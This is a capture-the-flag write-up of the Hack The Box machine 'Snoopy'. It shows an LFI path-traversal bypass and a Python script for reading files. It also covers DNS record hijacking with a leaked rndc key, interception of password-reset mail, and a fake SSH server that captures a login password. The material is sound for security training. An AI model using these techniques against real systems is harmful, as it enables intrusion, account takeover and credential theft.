# Snoopy

URL: https://app.hackthebox.com/machines/Snoopy

Level: Hard

Date: Sep 2024

Credits: for several steps I followed the great IPPsec's walkthrough :)

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [DNS](#dns)
- [Mattermost](#mattermost)
- [Enumeration](#enumeration)
- [Fuzzing](#fuzzing)
- [Python script to fetch files](#python-script-to-fetch-files)
- [Enumerating processes](#enumerating-processes)
- [Abusing DNS](#abusing-dns)
- [Spawn Postfix](#spawn-postfix)
- [Got mattermost access](#got-mattermost-access)
- [Fake SSH server](#fake-ssh-server)
- [SSH access as cbrown user](#ssh-access-as-cbrown-user)
- [Local enumeration](#local-enumeration)
- [User flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root flag](#root-flag)




## Reconnaissance

### nmap

```bash
$ sudo nmap -p- -T4 -n 10.10.11.212 -oN nmap_01
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 10:29 CEST
Nmap scan report for 10.10.11.212
Host is up (0.086s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 37.35 seconds


$ sudo nmap -p22,53,80 -sC -sV -T4 -n 10.10.11.212 -oN nmap_02
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 10:30 CEST
Nmap scan report for 10.10.11.212
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.76 seconds

```

### http

![](Pasted%20image%2020240905103804.png)

![](Pasted%20image%2020240905103829.png)

### dns

```bash
$ dig axfr @10.10.11.212 snoopy.htb

; <<>> DiG 9.20.1-1-Debian <<>> axfr @10.10.11.212 snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 48 msec
;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
;; WHEN: Thu Sep 05 10:43:20 CEST 2024
;; XFR size: 11 records (messages 1, bytes 325)
```

we add the discovered third domains to our `/etc/hosts`


## mattermost

the only vhost with a different content is `mattermost.snoopy.htb`

```
GET /download HTTP/1.1
Host: snoopy.htb
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://snoopy.htb/index.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![](Pasted%20image%2020240905112318.png)

if we try `/download.php` we get the same file.. so we know that there is PHP involved.

we also notice this request with a `file` parameter

![](Pasted%20image%2020240905113506.png)

maybe we can find some LFI?



![](Pasted%20image%2020240905113817.png)

![](Pasted%20image%2020240905113827.png)

our guess is that `download.php` creates a zip file for every requested file.

`Content-Lenght: 0` = no file :)

Interesting:

`GET /download?file=../announcement.pdf` does works!

it seems that page is stripping "bad characters" like `../`

Meanwhile, with `Gobuster`, let's do some

## enumeration

```bash
joshua@kaligra:~/Documents/htb/machines/Snoopy$ gobuster dir -x php -u http://10.10.11.212 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.212
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://10.10.11.212/assets/]
/forms                (Status: 301) [Size: 178] [--> http://10.10.11.212/forms/]
/.                    (Status: 200) [Size: 23418]
/download.php         (Status: 200) [Size: 11363570]
/download             (Status: 200) [Size: 11363570]
Progress: 86006 / 86008 (100.00%)
===============================================================
Finished
===============================================================
```


## Fuzzing

```bash
$ ffuf -u http://10.10.11.212/download?file=FUZZ -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.212/download?file=FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
..
..
```

better to skip for 0 bytes responses:

```bash
$ ffuf -u http://10.10.11.212/download?file=FUZZ -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
..
..
..
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 53ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 56ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 61ms]
....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 61ms]
:: Progress: [920/920] :: Job [1/1] :: 873 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

So, we get a bunch of replies with size 796

Let's try:


![](Pasted%20image%2020240905114933.png)

![](Pasted%20image%2020240905114951.png)our guess it that the page created a zip file with `/etc/passwd`

let's "copy to file" the response's body:

```bash
$ file response_body
response_body: Zip archive data, at least v2.0 to extract, compression method=deflate


mv response_body.zip+ response_body.zip


unzip response_body.zip
Archive:  response_body.zip
  inflating: press_package/etc/passwd


$ cat press_package/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
_laurel:x:999:998::/var/log/laurel:/bin/false

```


## Python script to fetch files 

IPPSec's python script to automatize file download

```python
#!/usr/bin/env python3
import requests
import io
import zipfile
import sys

def download(file):
        url = f'http://10.10.11.212/download?file=....//....//....//..../{file}'
        r = requests.get(url)
        if len(r.content) == 0:
                return None
        zip_content = io.BytesIO(r.content)
        with zipfile.ZipFile(zip_content) as z:
                content = z.read(f"press_package{file}")
        return content.decode()

file = download(sys.argv[1])
if file:
        print(file)
```


## enumerating processes


IPPSec's technique to get a list of processes running on the remote box:

```bash
joshua@kaligra:~/Documents/htb/machines/Snoopy$ for i in $(seq 1 100); do python3 ./download.py /proc/$i/cmdline; done
/sbin/init
```

we can also download `download.php` itself!

```bash
$ python3 ./download.py /proc/self/cwd/download.php > download.php
```

```php
$ cat download.php
<?php

$file = $_GET['file'];
$dir = 'press_package/';
$archive = tempnam(sys_get_temp_dir(), 'archive');
$zip = new ZipArchive();
$zip->open($archive, ZipArchive::CREATE);

if (isset($file)) {
        $content = preg_replace('/\.\.\//', '', $file);
        $filecontent = $dir . $content;
        if (file_exists($filecontent)) {
            if ($filecontent !== '.' && $filecontent !== '..') {
                $content = preg_replace('/\.\.\//', '', $filecontent);
                $zip->addFile($filecontent, $content);
            }
        }
} else {
        $files = scandir($dir);
        foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                        $zip->addFile($dir . '/' . $file, $file);
                }
        }
}

$zip->close();
header('Content-Type: application/zip');
header("Content-Disposition: attachment; filename=press_release.zip");
header('Content-Length: ' . filesize($archive));

readfile($archive);
unlink($archive);
?>

```


## Abusing dns

```bash
$ python3 download.py  /etc/bind/named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

with that key, we can update dns records on remote server.

first, we create the "update script"

```
server 10.10.11.212
zone snoopy.htb
update add mail.snoopy.htb 600 IN A 10.10.14.15
send
```

```bash
joshua@kaligra:~/Documents/htb/machines/Snoopy$ cat > update-dns.txt
server 10.10.11.212
zone snoopy.htb
update add mail.snoopy.htb 600 IN A 10.10.14.15
send
joshua@kaligra:~/Documents/htb/machines/Snoopy$ cat > rndc-key
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
joshua@kaligra:~/Documents/htb/machines/Snoopy$ nsupdate -k rndc-key update-dns.txt
```

that worked

```bash
joshua@kaligra:~/Documents/htb/machines/Snoopy$ dig +short @10.10.11.212 mail.snoopy.htb
10.10.14.15
```

## spawn Postfix

now we can spawn `postfix`, in order to listen on port `25/TCP` and eventually get the email for password reset. 
we use `tcpdump` to dump traffic

```bash
root@kaligra:~# postfix start
root@kaligra:~# fuser 25/tcp
25/tcp:               6202
root@kaligra:~# tcpdump -i tun0 -nn -s0 -X port 25 -w /tmp/mail.pcap
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
^C26 packets captured
26 packets received by filter
0 packets dropped by kernel

```

![](Pasted%20image%2020240905132931.png)

maybe we need to AVOID TLS :-)

We change `postfix` this way

```bash
joshua@kaligra:~/Documents/htb/machines/Snoopy$ grep none /etc/postfix/main.cf
smtpd_tls_security_level=none
smtp_tls_security_level=none
```

Now we need to make `postfix` accept message for `snoopy.htb` domain:

```bash
root@kaligra:~# postconf mydestination
mydestination = $myhostname, kaligra, localhost.localdomain, , localhost, snoopy.htb
```

We also need to create `cshultz` user for accepting message...

```bash
root@kaligra:~adduser cschult
```



![](Pasted%20image%2020240905134036.png)

We receive the message, and we found the reset link inside:

![](Pasted%20image%2020240905134830.png)


unfortunately, this is the result of password reset

![](Pasted%20image%2020240905134812.png)

`http://mm.snoopy.htb/reset_password_complete?token=3Dpcqw3=qdw9ad9716qcapg9ummra7ya5phzsr6f6urn54zwgkw64mrcrew58cp1wp3`

we need to "strip" `3D` just after token

![](Pasted%20image%2020240905135700.png)

## got mattermost access

![](Pasted%20image%2020240905142351.png)

if we remember, we found `provisioning.snoopy.htb` subdomain.

Let's see if we found a similar channel...

![](Pasted%20image%2020240905142437.png)

![](Pasted%20image%2020240905142448.png)
by typing `/server_provision` we can "trigged" the deploy of a new server:


![](Pasted%20image%2020240905142732.png)


In the third required field, we found this:

![](Pasted%20image%2020240905142807.png)

Our idea is that there is some automatic process that creates an SSH connection on target IP and run the deployment.

Let's try with our ip:

![](Pasted%20image%2020240905142936.png)

![](Pasted%20image%2020240905142951.png)

we got a connection!

![](Pasted%20image%2020240905143022.png)

## fake ssh server

Let's try this project

https://github.com/jaksi/sshesame

```bash
joshua@kaligra:/opt/tools$ git clone https://github.com/jaksi/sshesame
Cloning into 'sshesame'...
remote: Enumerating objects: 1598, done.
remote: Counting objects: 100% (478/478), done.
remote: Compressing objects: 100% (262/262), done.
remote: Total 1598 (delta 260), reused 271 (delta 213), pack-reused 1120 (from 1)
Receiving objects: 100% (1598/1598), 6.90 MiB | 15.73 MiB/s, done.
Resolving deltas: 100% (930/930), done.
```

build

```bash
joshua@kaligra:/opt/tools/sshesame$ go build
go: downloading github.com/adrg/xdg v0.5.0
go: downloading github.com/jaksi/sshutils v0.0.13
go: downloading github.com/prometheus/client_golang v1.19.1
go: downloading golang.org/x/term v0.22.0
go: downloading golang.org/x/crypto v0.25.0
go: downloading gopkg.in/yaml.v2 v2.4.0
go: downloading github.com/beorn7/perks v1.0.1
go: downloading github.com/cespare/xxhash/v2 v2.2.0
go: downloading github.com/prometheus/client_model v0.5.0
go: downloading github.com/prometheus/common v0.48.0
go: downloading github.com/prometheus/procfs v0.12.0
go: downloading google.golang.org/protobuf v1.33.0
go: downloading golang.org/x/sys v0.22.0

```

we made a couple of customization to YAML config file:

```bash
server:
  listen_address: 10.10.14.15:2222

..
..
public_key_auth:
    # Offer public key authentication as an authentication option.
    enabled: true

    # Accept all public keys.
    accepted: true <=====
```


listening

```bash
joshua@kaligra:/opt/tools/sshesame$ ./sshesame -config sshesame.yaml
INFO 2024/09/05 14:42:23 No host keys configured, using keys at "/home/joshua/.local/share/sshesame"
INFO 2024/09/05 14:42:23 Listening on 10.10.14.15:2222
```

we got credentials!

```bash
joshua@kaligra:/opt/tools/sshesame$ ./sshesame -config sshesame.yaml
INFO 2024/09/05 14:42:23 No host keys configured, using keys at "/home/joshua/.local/share/sshesame"
INFO 2024/09/05 14:42:23 Listening on 10.10.14.15:2222
2024/09/05 14:43:00 [10.10.11.212:35606] authentication for user "cbrown" with password "sn00pedcr3dential!!!" accepted
2024/09/05 14:43:00 [10.10.11.212:35606] connection with client version "SSH-2.0-paramiko_3.1.0" established
2024/09/05 14:43:00 [10.10.11.212:35606] [channel 0] session requested
2024/09/05 14:43:00 [10.10.11.212:35606] [channel 0] command "ls -la" requested
2024/09/05 14:43:00 [10.10.11.212:35606] [channel 0] closed
2024/09/05 14:43:00 [10.10.11.212:35606] connection closed
```



## ssh access as cbrown user

```bash
joshua@kaligra:/opt/tools/sshesame$ ssh cbrown@10.10.11.212
The authenticity of host '10.10.11.212 (10.10.11.212)' can't be established.
ED25519 key fingerprint is SHA256:XCYXaxdk/Kqjbrpe8gktW9N6/6egnc+Dy9V6SiBp4XY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.212' (ED25519) to the list of known hosts.
cbrown@10.10.11.212's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
cbrown@snoopy:~$ ls
cbrown@snoopy:~$

```

## local enumeration

```bash
cbrown@snoopy:~$ crontab -l
no crontab for cbrown
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

we can use `git apply` as `sbrown` user

Let's check on GTFObins

https://gtfobins.github.io/gtfobins/git/#file-read

...I surrender :)

